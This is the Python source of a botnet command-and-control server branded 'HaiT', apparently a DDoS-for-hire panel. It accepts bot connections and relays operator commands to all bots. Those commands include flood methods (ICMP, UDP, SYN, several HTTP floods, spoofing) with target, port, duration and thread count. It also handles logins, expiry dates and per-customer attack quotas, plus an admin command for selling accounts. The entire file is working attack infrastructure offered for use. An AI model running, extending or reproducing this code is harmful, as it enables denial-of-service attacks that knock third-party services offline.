HOST = '0.0.0.0'
PORT = 1002
CONTROL_PORT = 2323
import socket
import time
import threading
from datetime import datetime
GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
WHITE = "\033[37m"
BOLD = "\033[1m"
RESET = "\033[0m"
clients = {}
clients_lock = threading.Lock()
control_clients = []
control_lock = threading.Lock()
active_users = {}
active_users_lock = threading.Lock()
confirmation_count = 0
confirmation_lock = threading.Lock()

def load_accounts():
    accounts = {}
    try:
        with open('lg.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    parts = line.split(':')
                    if len(parts) >= 3:
                        user, password, expiry = parts[:3]
                        max_attacks = int(parts[3]) if len(parts) > 3 else 1
                        max_time = int(parts[4]) if len(parts) > 4 else 60
                        max_threads = int(parts[5]) if len(parts) > 5 else 100
                        accounts[user] = {
                            'password': password,
                            'expiry': expiry,
                            'max_attacks': max_attacks,
                            'max_time': max_time,
                            'max_threads': max_threads,
                            'active_attacks': 0
                        }
    except FileNotFoundError:
        print(f"{RED}[-] File lg.txt not found. Create it with format 'user:pass:dd/mm/yyyy:max_attacks:max_time:max_threads'{RESET}")
    return accounts

def save_accounts(accounts):
    with open('lg.txt', 'w') as f:
        for user, data in accounts.items():
            f.write(f"{user}:{data['password']}:{data['expiry']}:{data['max_attacks']}:{data['max_time']}:{data['max_threads']}\n")

def check_login(username, password, accounts):
    if username not in accounts:
        return False, "Invalid username or password"
    if accounts[username]['password'] != password:
        return False, "Invalid username or password"
    expiry_date = datetime.strptime(accounts[username]['expiry'], '%d/%m/%Y')
    if datetime.now() > expiry_date:
        return False, "Account expired"
    with active_users_lock:
        if username in active_users:
            return False, "Account already active"
    return True, "Authentication successful"

def handle_client(client_socket, client_address):
    global clients, confirmation_count
    client_id = f"{client_address[0]}:{client_address[1]}"
    with clients_lock:
        clients[client_id] = client_socket
        broadcast_to_control(f"{GREEN}[+] Bot connected: {client_address} | Total: {len(clients)}{RESET}")
    try:
        while True:
            try:
                data = client_socket.recv(1024).decode('utf-8').strip()
                if data == "PONG":
                    continue
                if data == "ATTACK_STARTED":
                    with confirmation_lock:
                        confirmation_count += 1
            except Exception as e:
                client_socket.send("PING\r\n".encode('utf-8'))
                time.sleep(1)
    except:
        with clients_lock:
            if client_id in clients:
                del clients[client_id]
        broadcast_to_control(f"{RED}[-] Bot disconnected: {client_address} | Total: {len(clients)}{RESET}")
    finally:
        client_socket.close()

def broadcast_to_control(message):
    with control_lock:
        for client in control_clients[:]:
            try:
                client.send(f"{message}\r\n".encode('utf-8'))
            except:
                control_clients.remove(client)

def broadcast_command(command):
    global confirmation_count
    with confirmation_lock:
        confirmation_count = 0
    with clients_lock:
        total_bots = len(clients)
        if total_bots == 0:
            broadcast_to_control(f"{RED}[-] No bots online{RESET}")
            return
        for client_id, client in list(clients.items()):
            try:
                client.send(f"{command}\r\n".encode('utf-8'))
            except:
                del clients[client_id]
        start_time = time.time()
        while time.time() - start_time < 5:
            time.sleep(0.1)
        broadcast_to_control(f"{GREEN}[+] Sent attack to {confirmation_count}/{total_bots} bots{RESET}")

def show_help():
    return f"{MAGENTA}{BOLD}╔════════════════════════════╗\r\n" \
           f"║            HaiT            ║\r\n" \
           f"║        t.me/hiahihn        ║\r\n" \
           f"╚════════════════════════════╝{RESET}\r\n" \
           f"{CYAN}Methods:{RESET} {WHITE}icmp, udp, tcpsyn, tcp, httpflood, httpstorm, httpcfb, httpio, httpspoof{RESET}\r\n" \
           f"{CYAN}Syntax:{RESET}  {WHITE}<method> <target> <port> <time> <threads>{RESET}\r\n" \
           f"{BLUE}Commands:{RESET}\r\n" \
           f"  {GREEN}cls{RESET}    - {YELLOW}Clear the screen{RESET}\r\n" \
           f"  {GREEN}bots{RESET}   - {YELLOW}Show online bots{RESET}\r\n" \
           f"  {GREEN}help{RESET}   - {YELLOW}Display this menu{RESET}\r\n" \
           f"  {GREEN}getip{RESET}  - {YELLOW}Find all IPs of URL{RESET}\r\n" \
           f"  {GREEN}exit{RESET}   - {YELLOW}End session{RESET}\r\n"

def handle_control_client(control_socket, address):
    global active_users, confirmation_count
    with control_lock:
        control_clients.append(control_socket)
    accounts = load_accounts()
    
    control_socket.send(f"\x1b{MAGENTA}[*] Username:{RESET}\x1b[0m ".encode('utf-8'))
    username = ''
    while not username.strip():
        username = control_socket.recv(1024).decode('utf-8').strip()
    
    control_socket.send(f"\x1b{MAGENTA}[*] Password:{RESET}\x1b[0;38;2;0;0;0m ".encode('utf-8'))
    password = ''
    while not password.strip():
        password = control_socket.recv(1024).decode('utf-8').strip()
    
    is_valid, message = check_login(username, password, accounts)
    if not is_valid:
        control_socket.send(f"{RED}[-] {message}{RESET}\r\n".encode('utf-8'))
        time.sleep(3)
        control_socket.close()
        return
    
    control_socket.send(f"{GREEN}[+] {message}{RESET}\r\n".encode('utf-8'))
    with active_users_lock:
        active_users[username] = control_socket
    
    user_data = accounts[username]
    expire = user_data['expiry']
    max_attacks = user_data['max_attacks']
    max_time = user_data['max_time']
    max_threads = user_data['max_threads']
    
    title = f"\033]0;HaiT | UserName: {username} | Expire: {expire} | Max Attacks: {max_attacks} | Max Time: {max_time} | Max Threads: {max_threads}\007"
    control_socket.send(title.encode('utf-8'))
    
    control_socket.send("\033[2J\033[H".encode('utf-8'))
    welcome_msg = f"{CYAN}{BOLD}╔═══════════════════════════════════════════════════════════════════╗\r\n" \
                  f"  Welcome to HaiT, you will expire on {GREEN}{expire}{CYAN}  \r\n" \
                  f"  Max Attacks: {GREEN}{max_attacks}{CYAN} | Max Time: {GREEN}{max_time}s{CYAN} | Max Threads: {GREEN}{max_threads}{CYAN}\r\n" \
                  f"╚═══════════════════════════════════════════════════════════════════╝{RESET}\r\n" \
                  f"{YELLOW}Type 'help' for commands{RESET}\r\n"
    control_socket.send(welcome_msg.encode('utf-8'))
    
    attack_methods = {"icmp", "udp", "tcpsyn", "tcp", "httpflood", "httpstorm", "httpcfb", "httpio", "httpspoof"}
    
    try:
        while True:
            control_socket.send(f"{MAGENTA}[{RESET}HaiT@{username}{MAGENTA}]>{RESET} ".encode('utf-8'))
            data = ''
            while not data.strip():
                data = control_socket.recv(1024).decode('utf-8').strip()
            parts = data.split()
            cmd = parts[0].lower()
            
            if cmd == "help":
                control_socket.send(f"{show_help()}".encode('utf-8'))
            elif cmd == "cls" or cmd == "clear":
                control_socket.send("\033[2J\033[H".encode('utf-8'))
            elif cmd == "bots" or cmd == "bot":
                control_socket.send(f"{BLUE}[*] Bots Online: {WHITE}{len(clients)}{RESET}\r\n".encode('utf-8'))
            elif cmd == "exit":
                control_socket.send(f"{YELLOW}[*] Session terminated{RESET}\r\n".encode('utf-8'))
                control_socket.close()
                return
            elif cmd == "getip":
                if len(parts) != 2:
                    control_socket.send(f"{WHITE}[-] Syntax: getip <url>{RESET}\r\n".encode('utf-8'))
                else:
                    url = parts[1]
                    try:
                        host = url.replace("https://", "").replace("http://", "").replace("www.", "").split('/')[0]
                        addr_info = socket.getaddrinfo(host, None, 0, socket.SOCK_STREAM)
                        ip_list = list(set([info[4][0] for info in addr_info]))
                        if not ip_list:
                            raise socket.gaierror
                        result = f"{CYAN}[+] URL: {WHITE}{url}{RESET}\r\n"
                        for ip in ip_list:
                            result += f"{CYAN}  IP: {WHITE}{ip}{RESET}\r\n"
                        control_socket.send(result.encode('utf-8'))
                    except socket.gaierror:
                        control_socket.send(f"{RED}[-] Invalid URL or unable to resolve IP{RESET}\r\n".encode('utf-8'))
                    except Exception as e:
                        control_socket.send(f"{RED}[-] Error: {str(e)}{RESET}\r\n".encode('utf-8'))
            elif cmd == "user" and username == "thaithinh":
                if len(parts) < 2:
                    control_socket.send(f"{RED}[-] Syntax: user <add/remove/list>{RESET}\r\n".encode('utf-8'))
                    continue
                subcmd = parts[1].lower()
                if subcmd == "add":
                    if len(parts) != 3:
                        control_socket.send(f"{RED}[-] Syntax: user add <user:pass:dd/mm/yyyy:max_attacks:max_time:max_threads>{RESET}\r\n".encode('utf-8'))
                        continue
                    try:
                        new_user_data = parts[2].split(':')
                        if len(new_user_data) != 6:
                            raise ValueError
                        new_user, new_pass, new_expiry, new_max_attacks, new_max_time, new_max_threads = new_user_data
                        datetime.strptime(new_expiry, '%d/%m/%Y')
                        accounts[new_user] = {
                            'password': new_pass,
                            'expiry': new_expiry,
                            'max_attacks': int(new_max_attacks),
                            'max_time': int(new_max_time),
                            'max_threads': int(new_max_threads),
                            'active_attacks': 0
                        }
                        save_accounts(accounts)
                        control_socket.send(f"{GREEN}[+] User {new_user} added successfully{RESET}\r\n".encode('utf-8'))
                    except:
                        control_socket.send(f"{RED}[-] Invalid format or date{RESET}\r\n".encode('utf-8'))
                elif subcmd == "remove":
                    if len(parts) != 3:
                        control_socket.send(f"{RED}[-] Syntax: user remove <username>{RESET}\r\n".encode('utf-8'))
                        continue
                    remove_user = parts[2]
                    if remove_user in accounts:
                        del accounts[remove_user]
                        save_accounts(accounts)
                        control_socket.send(f"{GREEN}[+] User {remove_user} removed successfully{RESET}\r\n".encode('utf-8'))
                    else:
                        control_socket.send(f"{RED}[-] User not found{RESET}\r\n".encode('utf-8'))
                elif subcmd == "list":
                    user_list = f"{CYAN}User List:{RESET}\r\n"
                    for user, data in accounts.items():
                        user_list += f"{WHITE}User: {user} | Expire: {data['expiry']} | Max Attacks: {data['max_attacks']} | Max Time: {data['max_time']} | Max Threads: {data['max_threads']}{RESET}\r\n"
                    control_socket.send(user_list.encode('utf-8'))
                else:
                    control_socket.send(f"{RED}[-] Unknown user subcommand{RESET}\r\n".encode('utf-8'))
            elif cmd in attack_methods:
                if len(parts) != 5:
                    control_socket.send(f"{RED}[-] Syntax: <method> <target> <port> <time> <threads>{RESET}\r\n".encode('utf-8'))
                    continue
                try:
                    method, target, port, seconds, threads = parts
                    port = int(port)
                    seconds = int(seconds)
                    threads = int(threads)
                    
                    if seconds > user_data['max_time']:
                        control_socket.send(f"{RED}[-] Time exceeds maximum allowed ({user_data['max_time']}s){RESET}\r\n".encode('utf-8'))
                        continue
                    if threads > user_data['max_threads']:
                        control_socket.send(f"{RED}[-] Threads exceed maximum allowed ({user_data['max_threads']}){RESET}\r\n".encode('utf-8'))
                        continue
                    if user_data['active_attacks'] >= user_data['max_attacks']:
                        control_socket.send(f"{RED}[-] Maximum active attacks reached ({user_data['max_attacks']}){RESET}\r\n".encode('utf-8'))
                        continue
                    
                    user_data['active_attacks'] += 1
                    command_str = f"{method} {target} {port} {seconds} {threads}"
                    attack_msg = f"{YELLOW}[!] Attack launched\r\n" \
                               f"{CYAN}Method:  {WHITE}{method}{RESET}\r\n" \
                               f"{CYAN}Target:  {WHITE}{target}{RESET}\r\n" \
                               f"{CYAN}Port:    {WHITE}{port}{RESET}\r\n" \
                               f"{CYAN}Time:    {WHITE}{seconds}s{RESET}\r\n" \
                               f"{CYAN}Threads: {WHITE}{threads}{RESET}"
                    broadcast_to_control(attack_msg)
                    broadcast_command(command_str)
                    
                    def decrease_attack():
                        time.sleep(seconds)
                        user_data['active_attacks'] -= 1
                    threading.Thread(target=decrease_attack, daemon=True).start()
                    
                except ValueError:
                    control_socket.send(f"{RED}[-] Port, time, and threads must be numbers{RESET}\r\n".encode('utf-8'))
            else:
                control_socket.send(f"{RED}[-] Unknown command{RESET}\r\n".encode('utf-8'))
    except Exception as e:
        print(e)
    finally:
        with control_lock:
            if control_socket in control_clients:
                control_clients.remove(control_socket)
        with active_users_lock:
            if username in active_users:
                del active_users[username]
        control_socket.close()

def main():
    bot_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    bot_server.bind((HOST, PORT))
    bot_server.listen(100)
    print(f"{GREEN}[+] Bot listener on {HOST}:{PORT}{RESET}")
    
    control_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    control_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    control_server.bind((HOST, CONTROL_PORT))
    control_server.listen(10)
    print(f"{GREEN}[+] Control server on {HOST}:{CONTROL_PORT}{RESET}")
    
    def accept_clients(server, handler):
        while True:
            client_socket, address = server.accept()
            thread = threading.Thread(target=handler, args=(client_socket, address))
            thread.daemon = True
            thread.start()
    
    threading.Thread(target=accept_clients, args=(bot_server, handle_client), daemon=True).start()
    threading.Thread(target=accept_clients, args=(control_server, handle_control_client), daemon=True).start()
    
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()